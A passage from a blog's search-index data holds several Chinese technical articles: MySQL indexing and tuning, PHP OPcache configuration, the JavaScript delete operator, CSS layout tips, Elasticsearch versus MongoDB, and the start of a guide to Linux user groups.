的特性而频繁的分裂调整，十分低效，而使用自增字段作为主键则是一个很好的选择 如何建立合适的索引建立索引的原理一个最重要的原则是最左前缀原理，在提这个之前要先说下联合索引，MySQL 中的索引可以以一定顺序引用多个列，这种索引叫做联合索引，一般的，一个联合索引是一个有序元组&lt;a1, a2, …, an&gt;，其中各个元素均为数据表的一列。另外，单列索引可以看成联合索引元素数为 1 的特例。 索引匹配的最左原则具体是说，假如索引列分别为 A，B，C，顺序也是 A，B，C： 那么查询的时候，如果查询【A】【A，B】 【A，B，C】，那么可以通过索引查询 如果查询的时候，采用【A，C】，那么 C 这个虽然是索引，但是由于中间缺失了 B，因此 C 这个索引是用不到的，只能用到 A 索引 如果查询的时候，采用【B】 【B，C】 【C】，由于没有用到第一列索引，不是最左前缀，那么后面的索引也是用不到了 如果查询的时候，采用范围查询，并且是最左前缀，也就是第一列索引，那么可以用到索引，但是范围后面的列无法用到索引 因为索引虽然加快了查询速度，但索引也是有代价的：索引文件本身要消耗存储空间，同时索引会加重插入、删除和修改记录时的负担，另外，MySQL 在运行时也要消耗资源维护索引，因此索引并不是越多越好 在使用 InnoDB 存储引擎时，如果没有特别的需要，请永远使用一个与业务无关的自增字段作为主键。如果从数据库索引优化角度看，使用 InnoDB 引擎而不使用自增主键绝对是一个糟糕的主意。 InnoDB 使用聚集索引，数据记录本身被存于主索引（一颗 B+Tree）的叶子节点上。这就要求同一个叶子节点内（大小为一个内存页或磁盘页）的各条数据记录按主键顺序存放，因此每当有一条新的记录插入时，MySQL 会根据其主键将其插入适当的节点和位置，如果页面达到装载因子（InnoDB 默认为 15/16），则开辟一个新的页（节点）。如果表使用自增主键，那么每次插入新的记录，记录就会顺序添加到当前索引节点的后续位置，当一页写满，就会自动开辟一个新的页。如下： 这样就会形成一个紧凑的索引结构，近似顺序填满。由于每次插入时也不需要移动已有数据，因此效率很高，也不会增加很多开销在维护索引上。 如果使用非自增主键（如果身份证号或学号等），由于每次插入主键的值近似于随机，因此每次新纪录都要被插到现有索引页得中间某个位置，如下： 此时 MySQL 不得不为了将新记录插到合适位置而移动数据，甚至目标页面可能已经被回写到磁盘上而从缓存中清掉，此时又要从磁盘上读回来，这增加了很多开销，同时频繁的移动、分页操作造成了大量的碎片，得到了不够紧凑的索引结构，后续不得不通过 OPTIMIZE TABLE 来重建表并优化填充页面。 因此，只要可以，请尽量在 InnoDB 上采用自增字段做主键。 建立索引的常用技巧 最左前缀匹配原则，非常重要的原则，mysql 会一直向右匹配直到遇到范围查询(&gt;、&lt;、between、like)就停止匹配，比如 a = 1 and b = 2 and c &gt; 3 and d = 4 如果建立(a,b,c,d)顺序的索引，d 是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d 的顺序可以任意调整。 =和 in 可以乱序，比如 a = 1 and b = 2 and c = 3 建立(a,b,c)索引可以任意顺序，mysql 的查询优化器会帮你优化成索引可以识别的形式 尽量选择区分度高的列作为索引,区分度的公式是 count(distinct col)/count(*)，表示字段不重复的比例，比例越大我们扫描的记录数越少，唯一键的区分度是 1，而一些状态、性别字段可能在大数据面前区分度就是 0，那可能有人会问，这个比例有什么经验值吗？使用场景不同，这个值也很难确定，一般需要 join 的字段我们都要求是 0.1 以上，即平均 1 条扫描 10 条记录 索引列不能参与计算，保持列“干净”，比如 from_unixtime(create_time) = ’2014-05-29’就不能使用到索引，原因很简单，b+树中存的都是数据表中的字段值，但进行检索时，需要把所有元素都应用函数才能比较，显然成本太大。所以语句应该写成 create_time = unix_timestamp(’2014-05-29’); 尽量的扩展索引，不要新建索引。比如表中已经有 a 的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可，当然要考虑原有数据和线上使用情况","link":"/database/mysql_index/"},{"title":"MySQL 优化","text":"配置优化指的 MySQL 的 server 端的配置，一般对于业务方而言，可以不用关注，毕竟会有专门的 DBA 来处理，但是对于原理的了解，我想，我们开发，是需要了解的 作者：吴德宝 AllenWu链接：https://juejin.cn/post/6844903555141206030 基本配置innodb_buffer_pool_size 这是安装完 InnoDB 后第一个应该设置的选项。缓冲池是数据和索引缓存的地方：这个值越大越好，这能保证你在大多数的读取操作时使用的是内存而不是硬盘。典型的值是 5-6GB(8GB 内存)，20-25GB(32GB 内存)，100-120GB(128GB 内存)。 innodb_log_file_size 这是 redo 日志的大小。redo 日志被用于确保写操作快速而可靠并且在崩溃时恢复。一直到 MySQL 5.1，它都难于调整，因为一方面你想让它更大来提高性能，另一方面你想让它更小来使得崩溃后更快恢复。幸运的是从 MySQL 5.5 之后，崩溃恢复的性能的到了很大提升，这样你就可以同时拥有较高的写入性能和崩溃恢复性能了。一直到 MySQL 5.5，redo 日志的总尺寸被限定在 4GB(默认可以有 2 个 log 文件)。这在 MySQL 5.6 里被提高了。如果你知道你的应用程序需要频繁的写入数据并且你使用的时 MySQL 5.6，你可以一开始就把它这是成 4G。 max_connections 如果你经常看到 Too many connections 错误，是因为 max_connections 的值太低了。这非常常见因为应用程序没有正确的关闭数据库连接，你需要比默认的 151 连接数更大的值。max_connection 值被设高了(例如 1000 或更高)之后一个主要缺陷是当服务器运行 1000 个或更高的活动事务时会变的没有响应。在应用程序里使用连接池或者在 MySQL 里使用进程池有助于解决这一问题。 InnoDB 配置innodb_file_per_table 这项设置告知 InnoDB 是否需要将所有表的数据和索引存放在共享表空间里（innodb_file_per_table = OFF） 或者为每张表的数据单独放在一个.ibd 文件（innodb_file_per_table = ON）。每张表一个文件允许你在 drop、truncate 或者 rebuild 表时回收磁盘空间。这对于一些高级特性也是有必要的，比如数据压缩。但是它不会带来任何性能收益。你不想让每张表一个文件的主要场景是：有非常多的表（比如 10k+）。MySQL 5.6 中，这个属性默认值是 ON，因此大部分情况下你什么都不需要做。对于之前的版本你必需在加载数据之前将这个属性设置为 ON，因为它只对新创建的表有影响。 innodb_flush_log_at_trx_commit 默认值为 1，表示 InnoDB 完全支持 ACID 特性。当你的主要关注点是数据安全的时候这个值是最合适的，比如在一个主节点上。但是对于磁盘（读写）速度较慢的系统，它会带来很巨大的开销，因为每次将改变 flush 到 redo 日志都需要额外的 fsyncs。将它的值设置为 2 会导致不太可靠（reliable）因为提交的事务仅仅每秒才 flush 一次到 redo 日志，但对于一些场景是可以接受的，比如对于主节点的备份节点这个值是可以接受的。如果值为 0 速度就更快了，但在系统崩溃时可能丢失一些数据：只适用于备份节点。 innodb_flush_method 这项配置决定了数据和日志写入硬盘的方式。一般来说，如果你有硬件 RAID 控制器，并且其独立缓存采用 write-back 机制，并有着电池断电保护，那么应该设置配置为 O_DIRECT；否则，大多数情况下应将其设为 fdatasync（默认值）。sysbench 是一个可以帮助你决定这个选项的好工具。 innodb_log_buffer_size 这项配置决定了为尚未执行的事务分配的缓存。其默认值（1MB）一般来说已经够用了，但是如果你的事务中包含有二进制大对象或者大文本字段的话，这点缓存很快就会被填满并触发额外的 I/O 操作。看看 Innodb_log_waits 状态变量，如果它不是 0，增加 innodb_log_buffer_size。 其他设置query_cache_size query cache（查询缓存）是一个众所周知的瓶颈，甚至在并发并不多的时候也是如此。 最佳选项是将其从一开始就停用，设置 query_cache_size = 0（现在 MySQL 5.6 的默认值）并利用其他方法加速查询：优化索引、增加拷贝分散负载或者启用额外的缓存（比如 memcache 或 redis）。如果你已经为你的应用启用了 query cache 并且还没有发现任何问题，query cache 可能对你有用。这是如果你想停用它，那就得小心了。 log_bin 如果你想让数据库服务器充当主节点的备份节点，那么开启二进制日志是必须的。如果这么做了之后，还别忘了设置 server_id 为一个唯一的值。就算只有一个服务器，如果你想做基于时间点的数据恢复，这（开启二进制日志）也是很有用的：从你最近的备份中恢复（全量备份），并应用二进制日志中的修改（增量备份）。二进制日志一旦创建就将永久保存。所以如果你不想让磁盘空间耗尽，你可以用 PURGE BINARY LOGS 来清除旧文件，或者设置 expire_logs_days 来指定过多少天日志将被自动清除。记录二进制日志不是没有开销的，所以如果你在一个非主节点的复制节点上不需要它的话，那么建议关闭这个选项。 skip_name_resolve 当客户端连接数据库服务器时，服务器会进行主机名解析，并且当 DNS 很慢时，建立连接也会很慢。因此建议在启动服务器时关闭 skip_name_resolve 选项而不进行 DNS 查找。唯一的局限是之后 GRANT 语句中只能使用 IP 地址了，因此在添加这项设置到一个已有系统中必须格外小心。 SQL 调优一般要进行 SQL 调优，那么就说有慢查询的 SQL，系统或者 server 可以开启慢查询日志，尤其是线上系统，一般都会开启慢查询日志，如果有慢查询，可以通过日志来过滤。但是知道了有需要优化的 SQL 后，下面要做的就是如何进行调优 慢查询优化基本步骤 先运行看看是否真的很慢，注意设置 SQL_NO_CACHE where 条件单表查，锁定最小返回记录表。这句话的意思是把查询语句的 where 都应用到表中返回的记录数最小的表开始查起，单表每个字段分别查询，看哪个字段的区分度最高 explain 查看执行计划，是否与 1 预期一致（从锁定记录较少的表开始查询） order by limit 形式的 sql 语句让排序的表优先查 了解业务方使用场景 加索引时参照建索引的几大原则 观察结果，不符合预期继续从 0 分析 常用调优手段执行计划 explain，在日常工作中，我们有时会开慢查询去记录一些执行时间比较久的 SQL 语句，找出这些 SQL 语句并不意味着完事了，我们常常用到 explain 这个命令来查看一个这些 SQL 语句的执行计划，查看该 SQL 语句有没有使用上了索引，有没有做全表扫描，这都可以通过 explain 命令来查看。所以我们深入了解 MySQL 的基于开销的优化器，还可以获得很多可能被优化器考虑到的访问策略的细节，以及当运行 SQL 语句时哪种策略预计会被优化器采用。 使用 explain 只需要在原有 select 基础上加上 explain 关键字就可以了，如下： 1234567mysql&gt; explain select * from servers;+----+-------------+---------+------+---------------+------+---------+------+------+-------+| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |+----+-------------+---------+------+---------------+------+---------+------+------+-------+| 1 | SIMPLE | servers | ALL | NULL | NULL | NULL | NULL | 1 | NULL |+----+-------------+---------+------+---------------+------+---------+------+------+-------+1 row in set (0.03 sec) 简要解释下 explain 各个字段的含义 id : 表示 SQL 执行的顺序的标识,SQL 从大到小的执行 select_type：表示查询中每个 select 子句的类型 table：显示这一行的数据是关于哪张表的，有时不是真实的表名字 type：表示 MySQL 在表中找到所需行的方式，又称“访问类型”。常用的类型有： ALL, index, range, ref, eq_ref, const, system, NULL（从左到右，性能从差到好） possible_keys：指出 MySQL 能使用哪个索引在表中找到记录，查询涉及到的字段上若存在索引，则该索引将被列出，但不一定被查询使用 Key：key 列显示 MySQL 实际决定使用的键（索引），如果没有选择索引，键是 NULL。 key_len：表示索引中使用的字节数，可通过该列计算查询中使用的索引的长度（key_len 显示的值为索引字段的最大可能长度，并非实际使用长度，即 key_len 是根据表定义计算而得，不是通过表内检索出的） ref：表示上述表的连接匹配条件，即哪些列或常量被用于查找索引列上的值 rows： 表示 MySQL 根据表统计信息及索引选用情况，估算的找到所需的记录所需要读取的行数，理论上行数越少，查询性能越好 Extra：该列包含 MySQL 解决查询的详细信息 EXPLAIN 的特性 EXPLAIN 不会告诉你关于触发器、存储过程的信息或用户自定义函数对查询的影响情况 EXPLAIN 不考虑各种 Cache EXPLAIN 不能显示 MySQL 在执行查询时所作的优化工作 部分统计信息是估算的，并非精确值 EXPALIN 只能解释 SELECT 操作，其他操作要重写为 SELECT 后查看执行计划。","link":"/database/mysql_optimization/"},{"title":"PHP 缓存优化","text":"OPcache 是 PHP 中的 Zend 扩展，可以大大提升 PHP 的性能。 OPcache 通过将 PHP 脚本预编译的字节码存储到共享内存中来提升 PHP 的性能， 存储预编译字节码的好处就是 省去了每次加载和解析 PHP 脚本的开销。 原理Opcode 是一种 PHP 文件被 Zend 引擎编译后的中间语言，就像 Java 的 ByteCode，或 .NET 的 MSL，Zend 引擎在执行代码时会经过如下 4 个步骤： Scanning，re2c 进行词法分析和语法分析，将 PHP 代码转换为语言片段（Tokens） Parsing，将 Tokens 转换成简单而有意义的表达式 Compilation，将表达式编译成 Opcodes Execution，顺次执行 Opcodes，每次一条，从而实现 PHP 脚本的功能 如果你在 php.ini 中开启了 Opcache，那么每次请求来临时，Zend 引擎就不需要重复执行前面 3 步，从而大幅提升运行的性能 配置opcache.enable启用操作码缓存，默认为 1 开启 opcache.memory_consumptionOPcache 的共享内存大小，以兆字节为单位。默认 64，可适当调大。 opcache.interned_strings_buffer用来存储预留字符串的内存大小，以兆字节为单位。默认值为 8，建议根据服务器内存大小，设置一个大于 64 的值即可 通过字符串驻留（string interning）的技术来改善性能。例如，如果你在代码中使用了 1000 次字符串 foobar，Zend 引擎在第一次使用这个字符串时会分配一个不可变的内存区域来存储这个字符串，之后的 999 次都会直接引用这个内存区域，而不需要重复创建。 此参数将字符串驻留这个特性提升一个层次，默认情况下这个不可变的内存区域只会存在于单个 php-fpm 的进程中，如果设置了这个选项，那么这个内存区域将会在所有 php-fpm 进程中共享。在比较大的应用中，这可以非常有效地节约内存，提高应用的性能。 opcache.max_accelerated_filesOPcache 哈希表中可存储的脚本文件数量上限。真实的取值是在质数集合 { 223, 463, 983, 1979, 3907, 7963, 16229, 32531, 65407, 130987 } 中找到的第一个大于等于设置值的质数。设置值取值范围最小值是 200，最大值在 PHP 5.5.6 之前是 100000，PHP 5.5.6 及之后是 1000000。 opcache.validate_timestamps如果启用，那么 OPcache 会每隔 opcache.revalidate_freq 设定的秒数 检查脚本是否更新。如果禁用此选项，你必须使用 opcache_reset() 或者 opcache_invalidate() 函数来手动重置 OPcache，也可以 通过重启 Web 服务器来使文件系统更改生效。 每次检测都是一次 stat 系统调用，众所周知，系统调用会消耗一些 CPU 时间，并且 stat 系统调用会进行磁盘 I/O，更加浪费性能。不仅如此，假设你对服务器中的 PHP 文件进行了一次大量的更新，更新的过程中部分旧的文件会因为未过期而依然生效，和部分已生效的新文件混合在一起产生作用，必然会产生不确定因素，带来很多麻烦，所以建议将此参数的值设置为 0。 opcache.file_update_protection如果文件的最后修改时间距现在不足此项配置指令所设定的秒数，那么这个文件不会进入到缓存中。这是为了防止尚未完全修改完毕的文件进入到缓存。如果你的应用中不存在部分修改文件的情况，把此项设置为 0 可以提高性能。 opcache.huge_code_pages启用或者禁用将 PHP 代码（文本段）拷贝到 HUGE PAGES 中。 此项配置指令可以提高性能，但是需要在 OS 层面进行对应的配置。此参数值为 1 开启功能，默认值为 0。 众所周知，Linux 系统默认内存是以 4KB 进行分页的，而虚拟地址和内存地址是需要转换的，转换过程需要进行查表，CPU 为了加速查表会内建 TLB（Translation Lookaside Buffer），而 TLB 的大小是有限的，分页越小，表里的条目也就越多，TLB 的 Cache Miss 也就越高。 所以我们如果启用大内存页，就能间接降低 TLB 的 Cache Miss，而 Opcache 也能使用 Hugepage 来缓存 Opcodes，从而达到性能优化的目的。 需要注意的是此参数需要系统开启 Hugepage 功能，使用如下命令可以查看当前系统 Hugepage 的信息： 1cat /proc/meminfo | grep Huge 运行该命令会输入类似如下结果，可以看到 HugePages_Total 等参数的值为 0，也就是未开启 HugePages 功能。 12345678AnonHugePages: 495616 kBShmemHugePages: 0 kBHugePages_Total: 0HugePages_Free: 0HugePages_Rsvd: 0HugePages_Surp: 0Hugepagesize: 2048 kBHugetlb: 0 kB 修改 sysctl.conf 文件加入，其中 128 代表 HugePages 的大小（具体按情况而定），单位是 MB： 1vm.nr_hugepages = 128 生效配置 1sysctl -p","link":"/backend/php_optimization/"},{"title":"我不知道的JS之delete操作符","text":"MDN：delete 操作符用于删除对象的某个属性；如果没有指向这个属性的引用，那它最终会被释放。 这个简单的解释不禁引发了以下几个疑问： 作者：卢伟链接：https://zhuanlan.zhihu.com/p/149975274 delete 和内存释放有什么关系？从 MDN 的这个介绍我们可以知道，delete 操作符一般是用于对象的，它是用来删除对象上的属性的；而你使用了 delete 操作符之后，并不是立刻就会释放这个属性的引用，它只是把这个属性和这个对象解除绑定，比如我们通过下面的代码就可以知道这点： 123456789var obj = { a: 1, b: { c: 1 },};var new_obj = obj.b;delete obj.a;delete obj.b;console.log(obj); // {}console.log(new_obj); // {c: 1} 通过上面的代码我们知道，没有其他变量指向 obj 的 a 属性的引用（而且它是一个原始值），而 new_obj 指向了 obj 的 b 属性的引用，当我们删除了 obj 的 a 属性和 b 属性之后，obj 就变成了一个空对象，而 obj 本来 b 属性的引用此时还存在，因此它不会回收掉；从这个例子就可以看出：delete 操作符和释放内存无关，它只是断开了对象和属性的引用关系。只有当没有其他变量指向你删除的属性的引用时，这个属性所处的内存区块才会被下一次垃圾回收时释放。 delete 只能用在对象属性上吗？如果我用在值上会怎么样？delete 操作符的语法是： 1delete expression; 也就是说 delete 操作符会把它的操作数当成一个表达式，进而去删除这个表达式计算的结果。所以，“delete x”归根到底，是在删除一个表达式的、引用类型的结果（Result），而不是在删除 x 表达式，或者这个删除表达式的值（Value）。 所以，现在这里的 x，其实不是值（Value）类型的数据，而是一个表达式运算的结果（Result）。而在进一步的删除操作之前，JavaScript 需要检测这个 Result 的类型： 如果它是值，则按照传统的 JavaScript 的约定返回 true； 如果它是一个引用，那么对该引用进行分析，以决定如何操作。 这个检测过程说明，ECMAScript 约定：任何表达式计算的结果（Result）要么是一个值，要么是一个引用。并且需要留意的是，在这个描述中，所谓对象，其实也是值。准确地说，是“非引用类型”。例如：delete {}也会被当成值来处理。 再删除这些所谓的值的时候，遵循这样一个原则：delete 运算发现它的操作数是“值 / 非引用类型”，就直接返回了 true。其实什么也没有发生。 这里其实有一个例外，而这个例外我们后面再解释是为什么；就是 delete undefined 返回的结果是 false，这与我们之前提出的原则相矛盾。这里就引出了下一个问题：delete 不能删除什么？ delete 不能移除什么？这个问题 MDN 上有详细解答，并且指出几种 delet 不能删除的值，这里我们稍微做一下总结归纳，其实就一点：delete 不能移除不可设置的(Non-configurable)属性。 MDN 上提到 delete 不能移除用 var 声明的变量，这是因为 var 声明的变量我们知道是直接挂在在全局对象下作为全局对象的属性的，当它被挂载时会被置为不可设置的(Non-configurable)属性 12345678var a = 1;b = 2; // 直接使用未声明的变量在非严格模式下不会报错，并且也会被挂载到全局对象下console.log(Object.getOwnPropertyDescriptor(window, &quot;a&quot;));// {value: 1, writable: true, enumerable: true, configurable: false}console.log(Object.getOwnPropertyDescriptor(window, &quot;b&quot;));// {value: 2, writable: true, enumerable: true, configurable: true}delete a; // falsedelete b; // true MDN 上还提到 let 和 const 声明的变量也不能被删除，这个我没有想到可以演示的代码，但是猜测 let 和 const 声明的变量会挂载到它所在的作用域下，并且也是不可设置的(Non-configurable)属性（PS：如果想到示例再补充示例代码） 为什么 delete undefined 返回 false这里引用大神的回答： 早期的 JavaScript 中，undefined 是一个特殊值，是在运行期中通过 void 运算，或者不返回值的函数，又或者一个声明了但未赋值的变量，等等类似这样的情况来“计算得到”的。所以在 JavaScript 的早期版本中，你没有办法直接判断“undefined 是 undefined”，例如无法写出 x === undefined 这样的代码，而你只能写类似 typeof(x) ===’undefined’这样的代码。 后来（其实也没有太久），规范就约定把 undefined 作为可以缺省访问的名字，类似于 null。但是这个时候就带来了一个矛盾，因为这个 undefined 很重要，早期的绝大多数框架或引擎都把它作为一个“全局名字”给声明了。也就是说，ECMAScript 现在既没有办法将它规范成一个 keyword，也没有办法处理成保留字等等，它看起来像 null，但又没有办法在规范层面强制它。 所以……ECMAScript 就搞了一个“奇招”：我们把 undefined 声明成全局的属性，怎么样？！ 嗯嗯，很好。所以你看，现在的引擎上面 undefined 看起来长得跟 null 值差不多，而且在 ECMAScript 规范中它们都还是平级的（是原始值），而且它们的作用也很接近，最后他们都还是从最初的 JavaScript 1.x 中就存在的概念，但是 undefined/null 两者却在实现上完全不同：undefined 是一个全局属性，而 null 是一个关键字。 由于 undefined 是全局属性，所以 delete undefined 其实就是 delete global.undefined，是删除引用，而不是删除值。而这个属性是只读的，所以就返回 false 了。 讲道理这段历史还挺有意思的，这点可以通过以下代码来印证： 12345678console.log(void 0 === undefined); // truedelete void 0; // truedelete undefined; // falsedelete null; // trueconsole.log(Object.getOwnPropertyDescriptor(window, &quot;undefined&quot;));// {value: undefined, writable: false, enumerable: false, configurable: false}console.log(Object.getOwnPropertyDescriptor(window, &quot;null&quot;));// undefined delete 总结： delete 只会在移除对象属性失败的情况下返回 false，而这种情况只会发生在这个属性是一个不可设置的(Non-configurable)属性， delete 通常会在这个操作什么也不干的情况下（虽然第一条它也是什么都没干）返回 true，或者在成功移除对象属性时返回 true delete 操作只会在自身的属性上起作用，如果对象的原型链上有一个与待删除属性同名的属性，那么删除属性之后，对象会使用原型链上的那个属性","link":"/front-end/js_delete/"},{"title":"前端开发需要知道的 10 个 CSS 技巧","text":"个人觉得 CSS 是每个前端开发人员都必须掌握的基础，以完成相应的交互和终端设备的响应。在项目开发中，有些容易被忽略的小问题带来项目后期的胶水代码。本文总结一些项目开发中 CSS 的 10 个小技巧。 作者：天行无忌链接：https://juejin.cn/post/6973517448557363214 使用相对单位通常我们在项目开发中，使用 px 作为尺寸的单位，而不是使用相对单位，如：rem、em 等。在万物互联的时代，最好的方式是相对单位 rem、vh、vw 等现代 CSS 布局（如 flexbox 和 grid）方式，最大限度的支持各种终端设备。 绝对单位 px ：是一个绝对单位，主要是因为它是固定的，不会根据任何其他元素的测量而改变。 相对单位 vw（viewpoint width）：相对于视口的宽度 vh（viewpoint height）：相对于视口的高度 rem（font size of the root element）：相对于根 ( ) 元素 (默认字体大小通常为 16px ) em（font size of the element）：相对于父元素 % ：相对于父元素 123456789101112/* 不提倡 */.wrap { font-size: 14px; margin: 10px; line-height: 24px;}/* 建议 */.wrap { font-size: 1.2rem; margin: 0.5rem; line-height: 1.6em;} 代码复用很多开发人员在谈到 CSS 时都觉得代码重复性很高，在项目开发中这不是一个好的做法。好在现在有 CSS 预处理器（sass/scss、less、stylus、Turbine），能够让我们可以更好的规划 CSS 代码，提高其复用性。 当然需要提高代码复用，还是需要一定的 CSS 的基础，来设计好代码结构，如下： 1234567891011121314151617/* 不提倡 */.container { background-color: #efefef; border-radius: 0.5rem;}.sidebar { background-color: #efefef; border-radius: 0.5rem;}/* 建议 */.container,.sidebar { background-color: #efefef; border-radius: 0.5rem;} CSS 重置每个浏览器都有自己的默认样式，因此，当网页不包含 CSS 时，浏览器会为文本添加一些基本的默认样式、填充、边距等。 可以通过使用通用选择器 * 重置 padding、margin、box-sizing 和 font-family 来实现这一点。 像这样： 12345678910* { padding: 0; margin: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif;}ul,li { list-style: none;} 不过这些问题现在基本都被框架解决了，对于初学者建议可以模仿但不建议一开始就上框架。 不使用颜色名称不要使用red、blue等颜色名称，相反，建议使用颜色的十六进制值。 为什么呢？因为当使用像 red 这样的颜色名称时，在不同的浏览器或者设备中显示会有所不同。 123456789/* 不提倡 */.container { background-color: red;}/* 建议 */.container { background-color: #ff0000;} 使用简写属性在 CSS 中，多用简写属性，少用单独属性，具体哪些是简写属性，哪些是单独属性，下面列举一下常见的一些属性，是以通常项目为原则。 简写属性background、font、 margin、padding、 border、 transition、 transform、 list-style、 border-radius 单独属性rotate、scale、background-color、background-image、background-position、padding-left、padding-right、padding-top、padding-bottom、margin-left、margin-top、margin-right、margin-bottom、border-top、 border-right、 border-bottom、 border-left、 border-width、 border-color、 border-style 1234567891011/* 不提倡 */.container { background-image: url(bg.png); background-repeat: no-repeat; background-position: center;}/* 建议 */.container { background: url(bg.png) no-repeat center;} 文本截取在项目开发中，有些列表只需要显示一行文字，有些列表需要显示固定函数的文字，过去通过字符截取的方式来实现，但存在截取不统一（文本内容不同英文、中文、标点符号等），再加上现在各种终端的适配，不足就被放大了。 现在最佳的方式是通过 CSS 来实现，在文本最后增加省略号（…）。 单行截取元素必须是 block 或 inline-block，如果溢出被隐藏，则文本溢出不起作用，并且元素必须具有定义的宽度或最大宽度集。 1234567p { display: inline-block; max-width: 300px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;} 多行截取123456p { display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 3; /* 需要显示的行数 */ overflow: hidden;} 垂直居中垂直居中是一个很常见的需求，有很多实现方式，在伸缩容器内的任何东西垂直居中： 1234.flex-vertically-center { display: flex; align-items: center;} inline、inline-block、table-cell 块垂直对齐： 12345img { /* 只对block有效 */ display: inline-block; vertical-align: middle;} 相对容器中垂直居中的绝对元素，下面代码是 .sub-container 在 .container 垂直居中： 12345678.container { position: relative;}.sub-container { position: absolute; top: 50%; transform: translateY(-50%);} 水平居中与垂直对齐类似，不过水平居中更容易一点。 块居中 1234.block-element { display: block; margin: 0 auto;} 内联或内联块文本居中 123.container { text-align: center;} 在相对容器内水平居中绝对元素： 12345678.container { position: relative;}.sub-container { position: absolute; top: 50%; transform: translateX(-50%);} flex 容器内的任何内容水平居中： 1234.flex-vertically-center { display: flex; justify-content: center;} 设置下一个或上一个兄弟元素样式对元素前面和后面的元素进行样式设置，在项目开发中很有用。例如 10 个按钮，当前按钮下一个及下一个的兄弟元素设置不同的颜色。 html 代码如下： 123456789101112&lt;div&gt; &lt;button&gt;1&lt;/button&gt; &lt;button&gt;2&lt;/button&gt; &lt;button&gt;3&lt;/button&gt; &lt;button&gt;4&lt;/button&gt; &lt;button class=&quot;current&quot;&gt;current&lt;/button&gt; &lt;button&gt;+ button&lt;/button&gt; &lt;button&gt;~ button&lt;/button&gt; &lt;button&gt;~ button&lt;/button&gt; &lt;button&gt;~ button&lt;/button&gt; &lt;button&gt;~ button&lt;/button&gt;&lt;/div&gt; css 代码： 12345678910.current ~ button { background-color: #000; color: #ffffff;}.current { background-color: #ff0000;}.current + button { background-color: #333;} 效果如下： 接下来设置当前按钮前面样式，css 代码如下： 12345678910111213141516171819button { padding: 10px 15px; border: 1px solid #444444; font-size: 12px; background-color: #ff0000; color: #000;}.current { background-color: #000; color: #fff;}.current ~ button { background: initial;}.container { width: 1000px; margin: 50px auto; text-align: center;} 效果如下： 宽高比如果想让盒子容器有一定的宽高比，如视频播放器尺寸，可以用几种方法来实现，其中有一种方法最直观。可以使用 calc 函数设置顶部填充 (height * width) / 100%。 如下，创建一个 720px 宽的 16 x 9 矩形： html 代码： 123&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/div&gt; css 代码： 1234567.container { width: 720px;}.box { padding-top: calc((9 / 16) * 100%); background: #efefef;} 效果如下： 还可以使用 after 伪元素来创建比例大小。 123456.box::after { content: &quot;&quot;; display: block; padding-top: calc((9 / 16) * 100%); background: #eee;} 上面的方案会导致里面所有的元素都必须向上移动或需要使用绝对定位。不过好消息是，CSS 增加了 aspect-ratio 属性。 aspect-ratio 为 box 容器规定了一个期待的纵横比，这个纵横比可以用来计算自动尺寸以及为其他布局函数服务。","link":"/front-end/css_skill/"},{"title":"Elasticsearch 和mongodb 各自适用场景","text":"来源于 《记十亿级 Es 数据迁移 mongodb 成本节省及性能优化实践》，详细说明可查看原文 作者：杨亚洲(mongodb)链接：https://zhuanlan.zhihu.com/p/373351625 8 字段以上的随机组合查询有些业务场景，查询条件是由用户触发，查询条件不固定，可能存在多个字段的随机组合查询。mongodb 和 mysql 等数据库，都需要手动创建索引，由于 8 字段以上的随机组合查询情况种类太多，因此很难手动建索引覆盖所有场景，所以选择 Es 更优，只是成本会更高。 全文检索虽然 mongodb 也支持全文检索，mongodb-4.2 以下版本全文检索能力性能和 ES 没法比，建议全文检索适用 Es。 mongodb-4.2 全文搜索已经开始支持 Lucene 引擎，可能性能会有很大提升，暂时没做研究，也没做性能对比，后续有空在研究。 其他复杂检索例如：非前缀模糊匹配查询 db.member.find({“name”:{ $regex:/XXX/ }})，查询 name 字段包含 XXX 的查询，这类查询 Es 更优，因为 mongodb、mysql 等底层都是 KV 存储，查找 KEY 的时候都是从左到右比较 key 字符串，如果是非前缀匹配模糊查询，就需要全表扫描。 查询以某字段为开头的文档，db.member.find({“name”:{$regex:/^XXX/}})这类就比较适合用 mongodb 查询，前缀匹配。 总结 没有万能的数据库，切记结合自身业务场景，选择最优数据库 主流数据库都有其存在的理由，不要因为在某些场景不适合而全盘否定该数据库其他层面的优势。例如不能因为 mongodb 在全文检索等复杂检索上面的弱势而全面否定 mongodb，也不能因为 Es 在磁盘成本、高并发读写等方面的劣势而否定 Es 在复杂检索上面的优势 切记以偏概全，捧一个踩一个，这都是及其不客观的行为","link":"/database/es_mongo/"},{"title":"Linux 用户添加到组","text":"Linux 组是用于管理 Linux 中用户帐户的组织单位。对于 Linux 系统中的每一个用户和组，它都有惟一的数字标识号。它被称为 用户 ID（UID）和组 ID（GID）。组的主要目的是为组的成员定义一组特权。它们都可以执行特定的操作，但不能执行其他操作。 来源于 《在 Linux 中把用户添加到组的四个方法》，详细说明可查看原文 作者：Linux 中国链接：https://zhuanlan.zhihu.com/p/63408566 Linux 中有两种类型的默认组。每个用户应该只有一个 主要组(primary group) 和任意数量的 次要组(secondary group)。 主要组： 创建用户帐户时，已将主要组添加到用户。它通常是用户的名称。在执行诸如创建新文件（或目录）、修改文件或执行命令等任何操作时，主要组将应用于用户。用户的主要组信息存储在 /etc/passwd 文件中。 次要组： 它被称为次要组。它允许用户组在同一组成员文件中执行特定操作。例如，如果你希望允许少数用户运行 Apache（httpd）服务命令，那么它将非常适合。 我假设你已经拥有此操作所需的组和用户。在本例中，我们将使用以下用户和组：user1、user2、user3，另外的组是 mygroup 和 mygroup1。 在进行更改之前，我希望检查一下用户和组信息。详见下文。 我可以看到下面的用户与他们自己的组关联，而不是与其他组关联。 12345678# id user1uid=1008(user1) gid=1008(user1) groups=1008(user1)# id user2uid=1009(user2) gid=1009(user2) groups=1009(user2)# id user3uid=1010(user3) gid=1010(user3) groups=1010(user3) 我可以看到这个组中没有关联的用户 12345# getent group mygroupmygroup:x:1012:# getent group mygroup1mygroup1:x:1013: 使用 usermod 命令usermod 命令修改系统帐户文件，以反映命令行上指定的更改。 如何使用 usermod 